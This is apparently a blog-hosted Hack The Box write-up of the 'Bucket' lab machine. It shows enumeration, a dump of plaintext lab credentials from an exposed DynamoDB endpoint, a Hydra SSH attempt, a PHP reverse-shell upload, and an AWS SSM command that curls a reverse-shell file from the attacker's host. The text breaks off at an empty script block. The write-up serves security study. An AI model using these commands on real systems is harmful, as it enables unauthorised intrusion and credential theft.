<!DOCTYPE html><html lang="en-US" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="Hack The Box - Bucket Writeup" /><meta property="og:locale" content="en_US" /><meta name="description" content="Zweilosec’s writeup on the medium-difficulty Linux machine bucket from https://hackthebox.eu" /><meta property="og:description" content="Zweilosec’s writeup on the medium-difficulty Linux machine bucket from https://hackthebox.eu" /><link rel="canonical" href="https://zweilosec.github.io/posts/bucket/" /><meta property="og:url" content="https://zweilosec.github.io/posts/bucket/" /><meta property="og:site_name" content="Hacker’s Rest" /><meta property="og:image" content="https://zweilosec.github.io/assets/img/bucket-0-bucket-infocard.png" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2021-03-15T14:00:00+00:00" /><meta name="twitter:card" content="summary_large_image" /><meta property="twitter:image" content="https://zweilosec.github.io/assets/img/bucket-0-bucket-infocard.png" /><meta property="twitter:title" content="Hack The Box - Bucket Writeup" /><meta name="twitter:site" content="@zweilosec" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2021-05-03T22:47:36+00:00","datePublished":"2021-03-15T14:00:00+00:00","description":"Zweilosec’s writeup on the medium-difficulty Linux machine bucket from https://hackthebox.eu","headline":"Hack The Box - Bucket Writeup","image":"https://zweilosec.github.io/assets/img/bucket-0-bucket-infocard.png","mainEntityOfPage":{"@type":"WebPage","@id":"https://zweilosec.github.io/posts/bucket/"},"url":"https://zweilosec.github.io/posts/bucket/"}</script><title>Hack The Box - Bucket Writeup | Hacker's Rest</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Hacker's Rest"><meta name="application-name" content="Hacker's Rest"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="https://cdn.jsdelivr.net"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script defer src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.15.0,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script async src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id=UA-170504820-1"></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'UA-170504820-1'); }); </script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="/assets/img/avatar/katana.gif" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">Hacker's Rest</a></div><div class="site-subtitle font-italic">Notes documenting my journey to OSCP and beyond.</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>PS C:\>WHOAMI</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center"> <a href="https://github.com/zweilosec" aria-label="github" class="order-3" target="_blank" rel="noopener"> <i class="fab fa-github-alt"></i> </a> <a href="https://twitter.com/zweilosec" aria-label="twitter" class="order-4" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['example','doamin.com'].join('@')" aria-label="email" class="order-5" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" class="order-6" > <i class="fas fa-rss"></i> </a> <span class="icon-border order-2"></span> <span id="mode-toggle-wrapper" class="order-1"> <i class="mode-toggle fas fa-adjust"></i> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } var self = this; /* always follow the system prefers */ this.sysDarkPrefers.addListener(function() { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.updateMermaid(); }); } /* constructor() */ setDark() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_KEY); sessionStorage.removeItem(ModeToggle.MODE_KEY); } get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode == ModeToggle.DARK_MODE; } get isLightMode() { return this.mode == ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer) ) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } updateMermaid() { if (typeof mermaid !== "undefined") { let expectedTheme = (this.modeStatus === ModeToggle.DARK_MODE? "dark" : "default"); let config = { theme: expectedTheme }; /* re-render the SVG › <https://github.com/mermaid-js/mermaid/issues/311#issuecomment-332557344> */ $(".mermaid").each(function() { let svgCode = $(this).prev().children().html(); $(this).removeAttr("data-processed"); $(this).html(svgCode); }); mermaid.initialize(config); mermaid.init(undefined, ".mermaid"); } } flipMode() { if (this.hasMode) { if (this.isSysDarkPrefer) { if (this.isLightMode) { this.clearMode(); } else { this.setLight(); } } else { if (this.isDarkMode) { this.clearMode(); } else { this.setDark(); } } } else { if (this.isSysDarkPrefer) { this.setLight(); } else { this.setDark(); } } this.updateMermaid(); } /* flipMode() */ } /* ModeToggle */ let toggle = new ModeToggle(); $(".mode-toggle").click(function() { toggle.flipMode(); }); </script> </span></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Posts </a> </span> <span>Hack The Box - Bucket Writeup</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Hack The Box - Bucket Writeup</h1><div class="post-meta text-muted d-flex flex-column"><div> <span class="semi-bold"> zweilosec </span> <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Mon, Mar 15, 2021, 2:00 PM +0000" prep="on" > Mar 15, 2021 <i class="unloaded">2021-03-15T14:00:00+00:00</i> </span></div><div> <span> <span class="timeago lastmod" data-toggle="tooltip" data-placement="bottom" title="Mon, May 3, 2021, 3:47 PM -0700" prefix="Updated " > May 3, 2021 <i class="unloaded">2021-05-03T22:47:36+00:00</i> </span> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="5630 words">31 min</span></div><div><meta name="twitter:card" content="summary"><meta name="twitter:site" content="@zweilosec"></div></div><div class="post-content"><h2 id="htb---bucket">HTB - Bucket</h2><h2 id="overview">Overview</h2><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/bucket-0-bucket-infocard.png" alt="Descriptive information card with statistics about this machine" /></p><p>This medium difficulty Linux machine by MrR3boot on Hack the Box was very interesting and quite relevant in today’s cloud-centric world. Many websites these days are hosted and run from AWS, and use AWS S3 buckets as data storage. This machine explores how misconfigurations and improper security for user credentials can lead to total compromise of the server that hosts the site. Since DynamoDB can be hosted locally as well as in the cloud, the server that was compromised in this case was the local machine on the internal network.</p><h2 id="useful-skills-and-tools">Useful Skills and Tools</h2><h3 id="upgrade-to-a-fully-interactive-reverse-shell">Upgrade to a fully interactive reverse shell</h3><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre><td class="rouge-code"><pre><span class="c">#On victim machine</span>
python3 <span class="nt">-c</span> <span class="s1">'import pty;pty.spawn("/bin/bash")'</span><span class="p">;</span> <span class="c">#spawn python psuedo-shell</span>
ctrl-z <span class="c">#send to background</span>

<span class="c">#On attacker's machine</span>
<span class="nb">stty </span>raw <span class="nt">-echo</span> <span class="c"># https://stackoverflow.com/questions/22832933/what-does-stty-raw-echo-do-on-os-x</span>
<span class="nb">stty</span> <span class="nt">-a</span> <span class="c">#get local number of rows &amp; columns</span>
<span class="nb">fg</span> <span class="c">#to return shell to foreground</span>

<span class="c">#On victim machine</span>
<span class="nb">export </span><span class="nv">SHELL</span><span class="o">=</span>bash
<span class="nb">stty </span>rows <span class="nv">$x</span> columns <span class="nv">$y</span> <span class="c">#Set remote shell to x number of rows &amp; y columns</span>
<span class="nb">export </span><span class="nv">TERM</span><span class="o">=</span>xterm-256color <span class="c">#allows you to clear console, and have color output</span>
</pre></table></code></div></div><h2 id="enumeration">Enumeration</h2><h3 id="nmap-scan">Nmap scan</h3><p>I started my enumeration with an nmap scan of <code class="language-plaintext highlighter-rouge">10.10.10.212</code>. The options I regularly use are:</p><div class="table-wrapper"><table><thead><tr><th style="text-align: left"><code class="language-plaintext highlighter-rouge">Flag</code><th style="text-align: left">Purpose<tbody><tr><td style="text-align: left"><code class="language-plaintext highlighter-rouge">-p-</code><td style="text-align: left">A shortcut which tells nmap to scan all ports<tr><td style="text-align: left"><code class="language-plaintext highlighter-rouge">-vvv</code><td style="text-align: left">Gives very verbose output so I can see the results as they are found, and also includes some information not normally shown<tr><td style="text-align: left"><code class="language-plaintext highlighter-rouge">-sC</code><td style="text-align: left">Equivalent to <code class="language-plaintext highlighter-rouge">--script=default</code> and runs a collection of nmap enumeration scripts against the target<tr><td style="text-align: left"><code class="language-plaintext highlighter-rouge">-sV</code><td style="text-align: left">Does a service version scan<tr><td style="text-align: left"><code class="language-plaintext highlighter-rouge">-oA $name</code><td style="text-align: left">Saves all three formats (standard, greppable, and XML) of output with a filename of <code class="language-plaintext highlighter-rouge">$name</code></table></div><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre><td class="rouge-code"><pre>┌──(zweilos㉿kali)-[~/htb/bucket]
└─$ nmap -sCV -n -p- -Pn -v -oA bucket 10.10.10.212                                              130 ⨯

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
80/tcp open  http    Apache httpd 2.4.41
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Did not follow redirect to http://bucket.htb/
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Nmap done: 1 IP address (1 host up) scanned in 248.46 seconds
</pre></table></code></div></div><p>My nmap scan showed that there were only two TCP ports open on this machine: 22 - SSH and 80 - HTTP.</p><h3 id="port-80---http">Port 80 - HTTP</h3><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/bucket-1-bucket-htb.png" alt="An error message saying unknown host for bucket.htb" /></p><p>I navigated to the IP address in my web browser to see what might be hosted over HTTP but was redirected to <code class="language-plaintext highlighter-rouge">bucket.htb</code>, which I added to my <code class="language-plaintext highlighter-rouge">/etc/hosts</code> file.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/bucket-1-bucket-htb2.png" alt="A website called Bucket Advertising Platform that talks about bug bounties and 0day research" /></p><p>There, I found an advertising platform that sold Information security related advertisements. There was no useful information on the site other than the email address <code class="language-plaintext highlighter-rouge">support@bucket.htb</code>.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/bucket-1-bucket-source.png" alt="The source code of the page shows a subdomain called s3 where an image is hosted" /></p><p>However, in the source code of the page I found a reference to an <code class="language-plaintext highlighter-rouge">s3</code> subdomain where the articles were hosted. I added this subdomain to my <code class="language-plaintext highlighter-rouge">/etc/hosts</code> file as well.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/bucket-2-s3-running.png" alt="Json data showing status running" /></p><p>Next I navigated to <code class="language-plaintext highlighter-rouge">s3.bucket.htb</code>, which led to a page with json output that simply said <code class="language-plaintext highlighter-rouge">{"status": "running"}</code>. Since there was nothing else here, I fired up gobuster to see if I could find any directories.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
</pre><td class="rouge-code"><pre>┌──(zweilos㉿kali)-[~/htb/reel2]
└─$ gobuster dir -u http://s3.bucket.htb -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-directories-lowercase.txt -t 20 -k
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://s3.bucket.htb
[+] Threads:        20
[+] Wordlist:       /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-directories-lowercase.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2021/02/16 20:36:05 Starting gobuster
===============================================================
/shell (Status: 200)
/health (Status: 200)
/server-status (Status: 403)
[ERROR] 2021/02/16 20:39:28 [!] parse http://s3.bucket.htb/error_log: net/url: invalid control character in URL
===============================================================
2021/02/16 20:45:21 Finished
===============================================================
</pre></table></code></div></div><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/bucket-2-s3-health.png" alt="Json data returned in the browser showing two services that are running" /></p><p>The first one I tried out was the directory <code class="language-plaintext highlighter-rouge">/health</code>. This page showed that two services were up and running: S3 and DynamoDB.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/bucket-2-444af250749d.png" alt="An error message showing a strange looking hostname" /></p><p>that came up was <code class="language-plaintext highlighter-rouge">/shell</code>, which I navigated to. This redirected me to <code class="language-plaintext highlighter-rouge">http://444af250749d:4566/shell/</code>. The hostname string was hex-encoded, and turned out to be the IP <code class="language-plaintext highlighter-rouge">242.80.116.157</code>. I didn’t feel like this was right, so I killed the connection. It seemed like either a misconfiguration, or someone was trying to compromise other player’s machines.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/markups/bucket-shell1.svg" alt="This was a misconfiguration, not malicious" /></p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/bucket-2-s3-shell.png" alt="Burp suite output showing what the redirect to shell looked like" /></p><p>I checked out what the request to this URL looked like in Burp suite, and noticed that it was talking to a <code class="language-plaintext highlighter-rouge">hypercorn-h11</code> server. This response also showed that I was able to use dangerous HTTP methods such as PUT and DELETE.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/bucket-2-s3-health2.png" alt="More information about the headers from the health endpoint showing hypercorn" /></p><p>In the Headers tab of the <code class="language-plaintext highlighter-rouge">/health</code> endpoint there was also the same information seen in Burp regarding the <code class="language-plaintext highlighter-rouge">hypercorn</code> server for the weird <code class="language-plaintext highlighter-rouge">/shell</code> IP redirect. I decided to keep poking at it to see if I could get anything useful from it. It did not seem to actually be something malicious.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/bucket-2-s3-shell2.png" alt="A DynamoDB web shell interface" /></p><p>I tried typing a <code class="language-plaintext highlighter-rouge">/</code> after <code class="language-plaintext highlighter-rouge">/shell</code>, which caused the page to go to an AWS DynamoDB shell page. This looked to be more likely what I wanted.</p><ul><li>https://docs.aws.amazon.com/amazondynamodb/latest/developerguide/Tools.CLI.html<li>https://docs.aws.amazon.com/amazondynamodb/latest/developerguide/WorkingWithTables.Basics.html<li>https://awscli.amazonaws.com/v2/documentation/api/latest/reference/dynamodb/index.html<li>https://awscli.amazonaws.com/v2/documentation/api/latest/reference/index.html</ul><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/bucket-2-s3-shell-help.png" alt="The DynamoDB help page with console shortcuts" /></p><p>I tried using the documentation to figure out how to get some useful information out of the web shell.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/bucket-2-s3-shell-tutorial.png" alt="" /></p><p>There was a tutorial mode that I tried to follow along with, but the web console did not seem to work. I tried installing and using the AWS CLI instead.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/markups/bucket-shell2.svg" alt="It may actually be possible to do this in the web shell" /></p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
</pre><td class="rouge-code"><pre>┌──(zweilos㉿kali)-[~/htb/reel2]
└─$ aws dynamodb list-tables --endpoint-url http://s3.bucket.htb/shell/ --no-paginate --no-sign-request 
You must specify a region. You can also configure your region by running "aws configure".
                           
┌──(zweilos㉿kali)-[~/htb/reel2]
└─$ aws dynamodb list-tables --endpoint-url http://s3.bucket.htb/shell/ --no-paginate --no-sign-request --region
To see help text, you can run:

  aws help
  aws &lt;command&gt; help
  aws &lt;command&gt; &lt;subcommand&gt; help

usage: aws [options] &lt;command&gt; &lt;subcommand&gt; [&lt;subcommand&gt; ...] [parameters]
aws: error: argument --region: expected one argument
                                                                                                       
┌──(zweilos㉿kali)-[~/htb/reel2]
└─$ aws dynamodb list-tables --endpoint-url http://s3.bucket.htb/shell/ --no-paginate --no-sign-request --region bucket
{
    "TableNames": [
        "Image",
        "Tag",
        "users"
    ]
}
</pre></table></code></div></div><p>It took a bit more reading to figure out how to use the CLI with dynamodb, and how to connect to the remote endpoint. After getting all of the options correctly set, I found that there were three tables in the database. Two of them I had created by playing around with the tutorial, but the third <code class="language-plaintext highlighter-rouge">users</code> database was already there.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
</pre><td class="rouge-code"><pre>┌──(zweilos㉿kali)-[~/htb/reel2]
└─$ aws dynamodb scan users --endpoint-url http://s3.bucket.htb/shell/ --no-paginate --no-sign-request --region bucket
To see help text, you can run:

  aws help
  aws &lt;command&gt; help
  aws &lt;command&gt; &lt;subcommand&gt; help

usage: aws [options] &lt;command&gt; &lt;subcommand&gt; [&lt;subcommand&gt; ...] [parameters]
aws: error: the following arguments are required: --table-name
                                                                                                       
┌──(zweilos㉿kali)-[~/htb/reel2]
└─$ aws dynamodb scan --table-name users --endpoint-url http://s3.bucket.htb/shell/ --no-paginate --no-sign-request --region bucket
{
    "Items": [
        {
            "password": {
                "S": "Management@#1@#"
            },
            "username": {
                "S": "Mgmt"
            }
        },
        {
            "password": {
                "S": "Welcome123!"
            },
            "username": {
                "S": "Cloudadm"
            }
        },
        {
            "password": {
                "S": "n2vM-&lt;_K_Q:.Aa2"
            },
            "username": {
                "S": "Sysadm"
            }
        }
    ],
    "Count": 3,
    "ScannedCount": 3
}
</pre></table></code></div></div><p>Thankfully the error messages I got while learning this tool were verbose enough that it was fairly easy to correct my mistakes and move on. After figuring out how to pull data from the table, I found that it contained three username/password combinations.</p><ol><li><code class="language-plaintext highlighter-rouge">Mgmt : Management@#1@#</code><li><code class="language-plaintext highlighter-rouge">Cloudadm : Welcome123!</code><li><code class="language-plaintext highlighter-rouge">Sysadm : n2vM-&lt;_K_Q:.Aa2</code></ol><p>I had no idea yet what to do with these credentials, however.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre>┌──(zweilos㉿kali)-[~/htb/bucket]
└─$ hydra -l users -P passwords 10.10.10.212 ssh      
Hydra v9.1 (c) 2020 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-02-17 14:49:29
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 3 tasks per 1 server, overall 3 tasks, 3 login tries (l:1/p:3), ~1 try per task
[DATA] attacking ssh://10.10.10.212:22/
1 of 1 target completed, 0 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-02-17 14:49:33
</pre></table></code></div></div><p>I tried to use the credentials to SSH in but none of them worked, so I did a bit more research on DynamoDB.</p><ul><li>https://docs.aws.amazon.com/amazondynamodb/latest/developerguide/EMRforDynamoDB.CopyingData.S3.html<li>https://awscli.amazonaws.com/v2/documentation/api/latest/reference/s3/index.html</ul><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>┌──(zweilos㉿kali)-[~/htb/reel2]
└─$ aws s3 ls --endpoint-url http://s3.bucket.htb
2021-02-18 19:12:03 adserver
</pre></table></code></div></div><p>I found a way to get a listing of endpoints that exist on the server and checked it out. I noticed that the one that came up <code class="language-plaintext highlighter-rouge">adserver</code> was the name of the site I originally saw on port 80. It seemed likely that this was the backend database for that site.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
</pre><td class="rouge-code"><pre>┌──(zweilos㉿kali)-[~/htb/reel2]
└─$ aws s3 ls --endpoint-url http://s3.bucket.htb adserver   
                           PRE images/
2021-02-18 19:20:02       5344 index.html
                                                                                                     
┌──(zweilos㉿kali)-[~/htb/reel2]
└─$ aws s3 cp --endpoint-url http://s3.bucket.htb adserver .

usage: aws s3 cp &lt;LocalPath&gt; &lt;S3Uri&gt; or &lt;S3Uri&gt; &lt;LocalPath&gt; or &lt;S3Uri&gt; &lt;S3Uri&gt;
Error: Invalid argument type
                                                                                                       
┌──(zweilos㉿kali)-[~/htb/reel2]
└─$ aws s3 cp --endpoint-url http://s3.bucket.htb s3://adserver .
                                                                                                 
┌──(zweilos㉿kali)-[~/htb/reel2]
└─$ aws s3 cp --endpoint-url http://s3.bucket.htb s3://adserver . --recursive
download: s3://adserver/index.html to ./index.html               
download: s3://adserver/images/bug.jpg to images/bug.jpg           
download: s3://adserver/images/malware.png to images/malware.png   
download: s3://adserver/images/cloud.png to images/cloud.png
</pre></table></code></div></div><p>I was able to download the files from the s3 bucket using the CLI. After reviewing them, I found that it was just the code and images for the site hosted on port 80. Since I was able to download files, I wondered if I was able to upload files as well. If so, I could upload a web shell here since I knew how where to access the files here.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/bucket-3-aws-php-noExec.png" alt="My PHP reverse shell file being downloaded instead of executing" /></p><p>I initially tried finding my php shell at <code class="language-plaintext highlighter-rouge">http://bucket.htb/php-code-exec.php</code>, but then I remembered the link I had found in the page’s source code was <code class="language-plaintext highlighter-rouge">"http://s3.bucket.htb/adserver/images/bug.jpg</code>, so this should be where my file was uploaded. Unfortunately it appeared as if php code was not executable on this server.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/markups/bucket-webshell.svg" alt="The folder is apparently cleaned up rather quickly, so you may have to upload it multiple times to test out everything." /></p><ul><li>https://docs.aws.amazon.com/systems-manager/latest/userguide/walkthrough-cli.html</ul><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre><td class="rouge-code"><pre>┌──(zweilos㉿kali)-[~/htb/bucket]
└─$ aws ssm describe-instance-information \                                            
        --output text --query "InstanceInformationList[*]" --endpoint-url http://s3.bucket.htb
None                                                                                           
┌──(zweilos㉿kali)-[~/htb/bucket]
└─$ aws ssm send-command \
        --document-name "AWS-RunShellScript" \
        --endpoint-url http://s3.bucket.htb \
        --parameters '{"commands":["#!/bin/bash","echo test"]}'                                                                                                       
┌──(zweilos㉿kali)-[~/htb/bucket]
└─$ aws ssm send-command \
        --document-name "AWS-RunShellScript" \
        --endpoint-url http://s3.bucket.htb \
        --parameters '{"commands":["#!/bin/bash","curl http://10.10.15.13:8081/php-reverse-shell.php"]}'
</pre></table></code></div></div><p>I found a page that talked about executing shell scripts using the AWS CLI, but it did not seem to do anything in my tests on this server.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="c">#!/bin/bash</span>

